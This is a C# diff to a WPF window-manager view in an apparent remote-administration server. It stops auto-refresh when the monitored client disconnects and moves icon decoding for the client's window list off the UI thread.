@@ -48,12 +48,14 @@ public partial class WindowManagerWindow : ThemedWindow
         GridWins.ItemsSource = _view;
 
         _server.RegisterHandler(clientId, PacketType.WinListResult, OnList);
+        _server.ClientDisconnected += OnClientDisconnected;
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
         Closed += (_, _) =>
         {
             _autoRefresh?.Stop();
             _server.UnregisterHandler(clientId, PacketType.WinListResult);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
 
@@ -107,33 +109,44 @@ public partial class WindowManagerWindow : ThemedWindow
 
     private void Refresh() => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WinGetList });
 
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() => _autoRefresh?.Stop());
+    }
+
     private void OnList(Packet pkt)
     {
         var d = JsonConvert.DeserializeObject<WinListResultData>(pkt.Data);
         if (d == null) return;
-        Dispatcher.BeginInvoke(() =>
+        // Decode icons off the UI thread to avoid blocking on base64+BitmapImage
+        _ = Task.Run(() =>
         {
-            var selectedHandles = GridWins.SelectedItems.Cast<WindowEntryVM>()
-                                          .Select(v => v.Handle).ToHashSet();
-            _windows.Clear();
-            foreach (var w in d.Windows)
-                _windows.Add(new WindowEntryVM
-                {
-                    Handle      = w.Handle,
-                    Title       = w.Title,
-                    ClassName   = w.ClassName,
-                    ProcessName = w.ProcessName,
-                    Pid         = w.Pid,
-                    Visible     = w.Visible,
-                    Icon        = DecodeIcon(w.IconB64),
-                });
-            _view?.Refresh();
-            if (selectedHandles.Count > 0)
-                foreach (var vm in _windows.Where(v => selectedHandles.Contains(v.Handle)))
-                    GridWins.SelectedItems.Add(vm);
-            int visible = _windows.Count(x => FilterWindow(x));
-            TxtCount.Text  = $"({visible}/{d.Windows.Count})";
-            TxtStatus.Text = string.Format(Lang.Get("WIN_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Windows.Count);
+            var decoded = d.Windows.Select(w => (w, Icon: DecodeIcon(w.IconB64))).ToList();
+            Dispatcher.BeginInvoke(() =>
+            {
+                var selectedHandles = GridWins.SelectedItems.Cast<WindowEntryVM>()
+                                              .Select(v => v.Handle).ToHashSet();
+                _windows.Clear();
+                foreach (var (w, icon) in decoded)
+                    _windows.Add(new WindowEntryVM
+                    {
+                        Handle      = w.Handle,
+                        Title       = w.Title,
+                        ClassName   = w.ClassName,
+                        ProcessName = w.ProcessName,
+                        Pid         = w.Pid,
+                        Visible     = w.Visible,
+                        Icon        = icon,
+                    });
+                _view?.Refresh();
+                if (selectedHandles.Count > 0)
+                    foreach (var vm in _windows.Where(v => selectedHandles.Contains(v.Handle)))
+                        GridWins.SelectedItems.Add(vm);
+                int visible = _windows.Count(x => FilterWindow(x));
+                TxtCount.Text  = $"({visible}/{d.Windows.Count})";
+                TxtStatus.Text = string.Format(Lang.Get("WIN_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Windows.Count);
+            });
         });
     }
 
